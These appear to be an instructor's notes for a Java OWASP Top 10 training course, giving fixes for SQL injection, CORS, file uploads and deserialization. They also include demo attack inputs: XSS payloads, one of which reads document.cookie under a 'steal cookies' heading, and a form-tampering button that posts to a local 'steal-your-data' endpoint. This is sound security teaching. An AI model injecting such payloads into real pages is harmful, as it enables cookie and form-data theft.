# Training Notes for Java Security

> Notes start at the first OWASP Top 10 exercise: SQL Injection

- The solution for the **SQL Injection** is:

```java
public List<AccountDTO> findAccountsByCustomerIdPS(String customerId) throws SQLException {
    String jql = "select * from Account where customer_id=?";
    final PreparedStatement preparedStatement = dataSource.getConnection().prepareStatement(jql);
    preparedStatement.setString(1, customerId);
    ResultSet rs = preparedStatement.executeQuery();

    List<AccountDTO> accounts = new ArrayList<>();
    while (rs.next()) {
        AccountDTO acc = AccountDTO.builder()
                .id(rs.getLong("id"))
                .customerId(rs.getString("customer_id"))
                .name(rs.getString("name"))
                .balance(rs.getLong("balance"))
                .build();

        accounts.add(acc);
    }

    return accounts;
}
```

- In **Broken Access Control** mention these:
    - ACL, ABAC, RBAC (and also that we'll talk about these later) 

- Things to talk about the **Misconfiguration** solution:
    - Use the proper `application.properties`
    - Check for potential hacks in the file upload (`..` for example)
    - Check file type
    - Check mime type
    - Use transformers that would fail if uploaded file was not the correct type

- In **XSS**, use this input first: `<b onmouseover=alert('Wufff!')>click me!</b>`
    - Then use an image: `<img src="https://images.dog.ceo/breeds/retriever-golden/n02099601_2663.jpg" />`
    - Then steal cookies:
        ```javascript
        <script>console.log("Document:" + document.cookie);</script>
        ```
- In **Deserialization** create a `UserDTO` that only holds the acceptable fields and map it to a `User` object.
- In **Known Vulnerabilities**
    - run `./mvnw clean install -Powasp-dependency-check`
    - Show [NVD](https://nvd.nist.gov/) (National Vulnerability Database)
    - Search for Spring
    - Mention Kyro that's on the list (with regards to deserialization)
    - Addd spring cloud config:
      ```xml
      <dependency>
          <groupId>org.springframework.cloud</groupId>
          <artifactId>spring-cloud-starter-config</artifactId>
      </dependency>
      ```
- In **CORS** 
    - Start the `cors-server` and `cors-client` projects
    - try loading `localhost:9090/simple-cors`
    - You will get an error
    - Solution is: `@CrossOrigin(origins = "http://localhost:9090")`
- In **Clickjacking**
- In **Form Tampering**
    - Use: 
    ```
    <button 
        type="submit" 
        form="profile-form"
        formaction="http://localhost:8080/steal-your-data"
        style="position:relative;top:94px;left:28px;"
        type="submit"
    >Update</button>
    ```